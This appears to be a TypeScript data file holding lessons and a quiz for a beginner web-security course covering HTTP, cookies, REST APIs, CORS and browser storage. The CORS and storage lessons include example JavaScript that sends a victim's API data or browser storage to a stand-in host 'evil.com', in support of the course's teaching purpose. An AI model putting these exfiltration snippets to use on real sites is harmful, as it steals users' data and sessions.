import type { Lesson, Course } from '../types';

const l = (id: string, title: string, instruction: string, extras?: Partial<Lesson>): Lesson => ({
  id, title, instruction, image: null, ...extras,
});

export const LESSONS: Lesson[] = [
    l('web-1', 'How the Web Works',
      `When you visit a website, your browser (the **client**) sends a request to a **server**, and the server sends back a response. But there's a lot happening behind the scenes at every step.

Here's the full process, broken down:

1. You type \`https://example.com\` into your browser. The browser first checks its cache — if it recently visited this site, it might already know the IP address and can skip the next step.

2. Browser asks DNS: "What's the IP of example.com?" DNS (Domain Name System) is the internet's phonebook. Your browser first checks your local DNS cache, then your operating system's cache, then asks your configured DNS server (usually your router or ISP). If that server doesn't know, it queries root DNS servers, then .com TLD servers, then the authoritative nameserver for example.com. This cascade typically takes milliseconds.

3. DNS responds: "93.184.216.34". Now your browser knows exactly which server to talk to.

4. Browser connects to that IP on port 443 (HTTPS). This involves a TCP three-way handshake (SYN, SYN-ACK, ACK) to establish a reliable connection, followed by a TLS handshake to negotiate encryption. Only after both handshakes complete can data flow securely.

5. Browser sends an HTTP request: "Give me /". The request includes headers telling the server things like which browser you're using, what content types you accept, and cookies for authentication.

6. Server processes the request and sends back HTML, CSS, and JavaScript. The response includes a status code (200 for success, 404 for not found, etc.) and the actual content.

7. Browser renders the page. It parses the HTML to build the DOM tree, fetches CSS to style it, executes JavaScript to make it interactive, and displays the final result.

What can go wrong at each step?
- **DNS step**: DNS poisoning can redirect you to a malicious server. DNS hijacking can intercept your queries.
- **Connection step**: Man-in-the-middle attacks can intercept the TLS handshake. Downgrade attacks can force weaker encryption.
- **HTTP request step**: Session hijacking can steal your cookies. SQL injection can exploit form inputs.
- **Response step**: XSS attacks can inject malicious JavaScript into the response. Content injection can modify what you see.

Every piece of this chain can be inspected, intercepted, or attacked — and that's exactly why understanding this process is essential for web security.

\`\`\`bash
# See the raw HTTP conversation
curl -v https://example.com
\`\`\`

The \`-v\` (verbose) flag shows the full request and response headers, not just the body. This is one of the simplest ways to see the HTTP layer in action and is a habit you should build early.`),

    l('web-2', 'HTTP Deep Dive',
      `HTTP is a text-based protocol. You can read and write HTTP by hand.

**Request structure:**
\`\`\`http
GET /page.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
\`\`\`

- First line: **METHOD** + **path** + **HTTP version**
- Headers: key-value pairs with metadata
- Blank line separates headers from body
- Body: data sent with POST/PUT requests

**Common headers:**
- \`Host\` — the target website (virtual hosting)
- \`Cookie\` — session data sent with each request
- \`User-Agent\` — browser identification
- \`Content-Type\` — format of the request body
- \`Authorization\` — credentials (Bearer tokens, Basic auth)

**Response structure:**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789; HttpOnly

<html>...</html>
\`\`\`

\`\`\`bash
# See only the response headers
curl -I https://example.com

# See everything
curl -v https://example.com
\`\`\``),

    l('web-3', 'HTML & Forms',
      `HTML forms are how users send data to servers. Every login form, search box, and contact form is an HTML form.

\`\`\`html
<form action="/login" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
\`\`\`

When submitted, the browser sends:
\`\`\`http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123
\`\`\`

**Input types** determine how the browser handles data:
- \`text\` — plain text
- \`password\` — masked input
- \`email\` — validates email format
- \`hidden\` — not visible to users but sent with the form
- \`file\` — file upload (uses \`multipart/form-data\`)

**Hidden fields** are interesting from a security perspective:

\`\`\`html
<input type="hidden" name="role" value="user">
<input type="hidden" name="price" value="19.99">
\`\`\`

These can be modified by the client before submission — never trust hidden fields on the server.`),

    l('web-4', 'Sessions & Authentication',
      `HTTP is **stateless** — each request is independent. Servers use **sessions** to remember who you are.

When you log in:
1. Server verifies your credentials
2. Server creates a session (stored on the server)
3. Server sends you a **session ID** in a cookie
4. Your browser sends this cookie with every subsequent request
5. Server looks up the session ID to identify you

\`\`\`http
# Server response after login
HTTP/1.1 200 OK
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
\`\`\`

**Cookie flags:**
- \`HttpOnly\` — JavaScript can't read this cookie (prevents XSS theft)
- \`Secure\` — only sent over HTTPS
- \`SameSite\` — prevents CSRF attacks

**The Same-Origin Policy** is a browser security feature that prevents scripts from one site accessing data from another. This is why cross-site scripting (XSS) attacks are dangerous — they bypass this policy by running in the context of the target site.

\`\`\`bash
# Check if a site uses secure cookies
curl -I https://example.com | grep -i set-cookie
\`\`\``),

    l('web-5', 'REST APIs',
      `**REST APIs** are how web applications talk to each other. Instead of returning HTML, they return data (usually JSON).

A typical API request:

\`\`\`bash
curl https://api.github.com/users/octocat
\`\`\`

\`\`\`json
{
  "login": "octocat",
  "id": 1,
  "avatar_url": "https://avatars.githubusercontent.com/u/1?v=4",
  "public_repos": 8
}
\`\`\`

**Common API patterns:**
- \`GET /api/users\` — list users
- \`GET /api/users/1\` — get user with ID 1
- \`POST /api/users\` — create a user (send JSON body)
- \`PUT /api/users/1\` — update user 1
- \`DELETE /api/users/1\` — delete user 1

\`\`\`bash
# POST JSON data to an API
curl -X POST https://api.example.com/users \\
  -H "Content-Type: application/json" \\
  -d '{"username": "hacker", "role": "admin"}'

# Include an API key
curl -H "Authorization: Bearer YOUR_TOKEN" \\
  https://api.example.com/protected
\`\`\`

**API keys** and tokens are how services authenticate API requests. If you find an exposed API key in JavaScript code or network traffic, you can impersonate that user.`, { hasQuiz: true, quiz: [
        { id: 'web-5-q1', question: 'What format do REST APIs typically return data in?', options: ['XML', 'HTML', 'JSON', 'CSV'], correctIndex: 2, explanation: 'REST APIs typically return JSON (JavaScript Object Notation) as the data format.' },
        { id: 'web-5-q2', question: 'Which HTTP method is used to create a new resource?', options: ['GET', 'POST', 'PUT', 'DELETE'], correctIndex: 1, explanation: 'POST is used to create new resources. PUT is for updating existing ones.' },
        { id: 'web-5-q3', question: 'What does the Authorization header typically contain?', options: ['Session cookie', 'Bearer token or API key', 'Content type', 'User agent'], correctIndex: 1, explanation: 'The Authorization header carries credentials like Bearer tokens, Basic auth, or API keys.' },
      ] }),

    l('web-6', 'CORS & Same-Origin Policy',
      `The Same-Origin Policy (SOP) is the browser's most important security feature. CORS relaxes it — but dangerously if misconfigured.

**Same-Origin Policy basics:**
\`\`\`bash
# Two URLs have the same origin if:
# Protocol + Host + Port are identical

# Same origin:
# https://example.com/page1
# https://example.com/page2

# Different origin:
# https://example.com     (different port)
# http://example.com      (different protocol)
# https://api.example.com (different host)
\`\`\`

**What SOP blocks:**
\`\`\`javascript
// This would be blocked if https://evil.com tries to read
// a response from https://bank.com
fetch('https://bank.com/api/balance')
  .then(r => r.json())
  .then(data => console.log(data))
// BLOCKED by Same-Origin Policy
\`\`\`

**CORS headers — how servers allow cross-origin:**
\`\`\`bash
# Check CORS headers on a target
curl -I https://example.com | grep -i "access-control"

# A permissive CORS policy (dangerous):
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true

# A restrictive CORS policy (safe):
# Access-Control-Allow-Origin: https://trusted-site.com
\`\`\`

**Test for CORS misconfiguration:**
\`\`\`bash
# Reflect the Origin header back (vulnerable!)
curl -H "Origin: https://evil.com" -I https://target.com/api | grep -i "access-control"

# If you see: Access-Control-Allow-Origin: https://evil.com
# AND: Access-Control-Allow-Credentials: true
# The site is vulnerable to CORS-based data theft
\`\`\`

**Preflight requests (OPTIONS):**
\`\`\`bash
# For non-simple requests, browser sends OPTIONS first
curl -X OPTIONS -H "Origin: https://test.com" -H "Access-Control-Request-Method: DELETE" https://api.target.com/data -v

# Response shows what's allowed:
# Access-Control-Allow-Methods: DELETE, PUT
# Access-Control-Allow-Headers: Authorization
\`\`\`

**CORS exploitation scenario:**
\`\`\`javascript
// If example.com/api/user has:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true

// An attacker's site can:
fetch('https://example.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal?data=' + JSON.stringify(data)))
\`\`\`

**Security checklist:**
- Never use \`Access-Control-Allow-Origin: *\` with credentials
- Whitelist specific origins, don't reflect the Origin header
- Use \`Vary: Origin\` header for dynamic CORS
- Don't rely on CORS alone for security — use proper auth`),

    l('web-7', 'Browser Storage & Client-Side Security',
      `Modern browsers provide multiple storage mechanisms. Each has different security properties.

**Types of browser storage:**
\`\`\`
Cookies        — 4KB limit, sent with every request, HttpOnly/Secure
localStorage   — 5-10MB, never sent automatically, accessible via JS
sessionStorage — Same as localStorage, cleared on tab close
IndexedDB      — Large structured data, async API
\`\`\`

**localStorage vs Cookies:**
\`\`\`javascript
// localStorage — persists until explicitly deleted
localStorage.setItem('token', 'abc123');
localStorage.getItem('token');  // "abc123"
localStorage.removeItem('token');
localStorage.clear();

// sessionStorage — cleared when tab closes
sessionStorage.setItem('temp', 'data');

// Cookies — sent with every HTTP request
document.cookie = "session=abc123; path=/; Secure";
\`\`\`

**XSS + Storage = Game Over:**
\`\`\`javascript
// If an attacker has XSS, they can steal ALL storage:
// localStorage
const allData = {};
for (let key in localStorage) {
    allData[key] = localStorage.getItem(key);
}

// sessionStorage
for (let key in sessionStorage) {
    allData[key] = sessionStorage.getItem(key);
}

// Send to attacker
fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(allData)
});
\`\`\`

**Check what's stored in your browser:**
\`\`\`javascript
// In browser console:
console.log(localStorage);
console.log(sessionStorage);
console.log(document.cookie);
\`\`\`

**Security best practices for storage:**
\`\`\`
// DO store:   Non-sensitive preferences, theme, language
// DON'T store: JWT tokens, API keys, PII, secrets

// Better alternatives:
// - Use httpOnly cookies for session tokens
// - Use backend sessions instead of client storage
// - Encrypt sensitive data before storing
\`\`\`

**Web Storage API vs Cookies:**
\`\`\`bash
# Check what cookies a site sets
curl -I https://example.com | grep "Set-Cookie"

# Check for secure cookie flags
curl -s -I https://example.com | grep -i "HttpOnly|Secure|SameSite"
\`\`\`

The rule: tokens in httpOnly cookies (protected from XSS), non-sensitive prefs in localStorage, and never store secrets in client-side storage.`),

    l('web-8', 'Browser Security Features',
      `Modern browsers have built-in defenses. Understanding them helps you both exploit and defend.

**Content Security Policy (CSP):**
\`\`\`bash
# Check a site's CSP header
curl -s -I https://example.com | grep -i "content-security-policy"

# Example CSP:
# Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

# Directives:
# default-src  — fallback for all resource types
# script-src   — which scripts can execute
# style-src    — which stylesheets can be used
# img-src      — which images can load
# connect-src  — which URLs can be fetched via JS
# frame-src    — which sites can be iframed
\`\`\`

**Evaluate CSP effectiveness:**
\`\`\`bash
# Weak CSP (allows XSS)
# script-src 'self' 'unsafe-inline'

# Strong CSP (blocks most XSS)
# script-src 'self' 'nonce-random123'

# Check CSP evaluator (Google's tool):
# https://csp-evaluator.withgoogle.com/
\`\`\`

**HTTP security headers checklist:**
\`\`\`bash
# Check all security headers at once
curl -s -I https://example.com | grep -iE "Strict-Transport|Content-Security|X-Content-Type|X-Frame-Options|Referrer-Policy|Permissions-Policy"

# What to look for:
# ✓ Strict-Transport-Security  (HSTS — force HTTPS)
# ✓ X-Content-Type-Options: nosniff  (prevent MIME sniffing)
# ✓ X-Frame-Options: DENY  (prevent clickjacking)
# ✓ Referrer-Policy: strict-origin  (control referrer data)
# ✓ Permissions-Policy  (control browser features)
\`\`\`

**Subresource Integrity (SRI):**
\`\`\`bash
# SRI ensures CDN files haven't been tampered with
# <script src="https://cdn.example.com/lib.js"
#         integrity="sha384-abc123..."
#         crossorigin="anonymous">

# Generate SRI hash
openssl dgst -sha384 -binary jquery.min.js | openssl base64 -A
\`\`\`

**Browser feature policies:**
\`\`\`bash
# Permissions-Policy controls what APIs the page can use
# Permissions-Policy: camera=(), microphone=(), geolocation=(self "https://trusted.com")

# Check what features a page requests:
# Open DevTools → Application → Permissions
\`\`\`

**How attackers bypass browser security:**
\`\`\`
1. CSP bypass via JSONP endpoints
2. CSP bypass via file upload endpoints (same-origin)
3. SOP bypass via DNS rebinding
4. HSTS bypass via HTTP downgrade (rare)
5. Iframe sandbox escape via plugin vulnerabilities
\`\`\`

Understanding browser security is essential for both finding XSS and preventing it. Every missing header is a potential vulnerability.`),
];

export const COURSE: Course = {
  id: 'web-technologies-101',
  title: 'Web Technologies 101',
  categoryId: 'web-security',
  description:
    'How the web works under the hood. HTTP, cookies, sessions, APIs — the foundation of every web attack.',
  overview:
    'Before you can break web apps, you need to understand how they’re built. This course covers HTTP requests and responses, HTML forms, cookies, sessions, REST APIs, and the browser security model.',
  estimatedMinutes: 55,
  cpCost: 75,
  learningObjectives: [
      'Understand HTTP methods, status codes, and headers',
      'Explain how cookies and sessions maintain state',
      'Describe how browsers enforce the Same-Origin Policy',
      'Identify the components of a URL and a REST API request',
  ],
  skillLevel: 'beginner',
  prerequisites: ["networking-101"],
  lessons: LESSONS,
};
